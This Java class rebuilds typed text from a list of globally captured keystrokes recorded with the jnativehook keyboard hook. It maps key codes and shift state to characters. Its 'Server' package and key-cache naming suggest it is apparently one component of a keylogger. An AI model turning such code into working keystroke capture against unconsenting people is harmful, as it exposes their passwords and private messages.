/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package Server;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import java.util.List;

/**
 *
 * @author HP
 */
public class TextFormat {
    public TextFormat(){
        
    }
     public static String Text(List<KeyStorage> keyCache){
        if(keyCache.isEmpty())
            return "";
    
        StringBuilder sb = new StringBuilder();
        boolean[] caps = new boolean[256];
        for(KeyStorage keyStorage : keyCache){
            caps[keyStorage.getKeyCode()] = keyStorage.isPressed();
            String key =processKey(keyStorage.getKeyCode(),caps[NativeKeyEvent.VC_SHIFT]);
            
            if(keyStorage.isPressed()){
                if(caps[NativeKeyEvent.VC_SHIFT]){
                    sb.append(key.toUpperCase());
                }
                else{
                    sb.append(key.toLowerCase());
                }
            }
        }
        
        return sb.toString();
    }
    
    private static String processKey(int keycode, boolean shifted){
        String key = NativeKeyEvent.getKeyText(keycode);
        
        if(key.length() !=1 && keycode != NativeKeyEvent.VC_SHIFT && keycode != NativeKeyEvent.VC_SPACE && keycode != NativeKeyEvent.VC_CAPS_LOCK) {
            key = "{"+NativeKeyEvent.getKeyText(keycode)+"}";
        }
        if(keycode == NativeKeyEvent.VC_SHIFT || keycode == NativeKeyEvent.VC_CAPS_LOCK){
            key = "";
        }
        if(keycode == NativeKeyEvent.VC_SPACE){
            key = " ";
        }
        if(keycode == NativeKeyEvent.VC_ENTER){
            key = "\n";
        }
        if(keycode == NativeKeyEvent.VC_SLASH){
            key = "/";
        }  
        if(keycode == NativeKeyEvent.VC_PERIOD){
            key = ".";
        }  
        if(keycode == NativeKeyEvent.VC_COMMA){
            key = ",";
        }  
        if(keycode == NativeKeyEvent.VC_SEMICOLON){
            key = ";";
        }  
        if(keycode == NativeKeyEvent.VC_QUOTE){
            key = "'";     
        }  
        if(keycode == NativeKeyEvent.VC_MINUS){
            key = "-";     
        } 
        if(keycode == NativeKeyEvent.VC_EQUALS){
            key = "=";     
        }
        if(keycode == NativeKeyEvent.VC_EQUALS&& shifted){
            key = "+";     
        } 
        if(keycode == NativeKeyEvent.VC_OPEN_BRACKET&& shifted){
            key = "{";     
        } 
        if(keycode == NativeKeyEvent.VC_CLOSE_BRACKET&& shifted){
            key = "}";     
        } 
        if(keycode == NativeKeyEvent.VC_BACK_SLASH&& shifted){
            key = "|";     
        }
        if(keycode == NativeKeyEvent.VC_1 && shifted){
            key = "!";
        }
        if(keycode == NativeKeyEvent.VC_2 && shifted){
            key = "@";
        }
        if(keycode == NativeKeyEvent.VC_3 && shifted){
            key = "#";
        }
        if(keycode == NativeKeyEvent.VC_4 && shifted){
            key = "$";
        }
        if(keycode == NativeKeyEvent.VC_5 && shifted){
            key = "%";
        }
        if(keycode == NativeKeyEvent.VC_6 && shifted){
            key = "^";
        }
        if(keycode == NativeKeyEvent.VC_7 && shifted){
            key = "&";
        }
        if(keycode == NativeKeyEvent.VC_8 && shifted){
            key = "*";
        }       
        if(keycode == NativeKeyEvent.VC_9 && shifted){
            key = "(";
        }  
        if(keycode == NativeKeyEvent.VC_0 && shifted){
            key = ")";
        }  
        if(keycode == NativeKeyEvent.VC_SLASH&& shifted){
            key = "?";
        }  
        if(keycode == NativeKeyEvent.VC_PERIOD&& shifted){
            key = ">";
        }  
        if(keycode == NativeKeyEvent.VC_COMMA&& shifted){
            key = "<";
        }  
        if(keycode == NativeKeyEvent.VC_SEMICOLON&& shifted){
            key = ":";
        }  
        if(keycode == NativeKeyEvent.VC_QUOTE&& shifted){
            key = "\"";     
        }  
        if(keycode == NativeKeyEvent.VC_MINUS&& shifted){
            key = "_";     
        } 
        if(keycode == NativeKeyEvent.VC_EQUALS&& shifted){
            key = "+";     
        } 
        if(keycode == NativeKeyEvent.VC_OPEN_BRACKET&& shifted){
            key = "{";     
        } 
        if(keycode == NativeKeyEvent.VC_CLOSE_BRACKET&& shifted){
            key = "}";     
        } 
        if(keycode == NativeKeyEvent.VC_BACK_SLASH&& shifted){
            key = "|";     
        } 
        return key;
    }
}
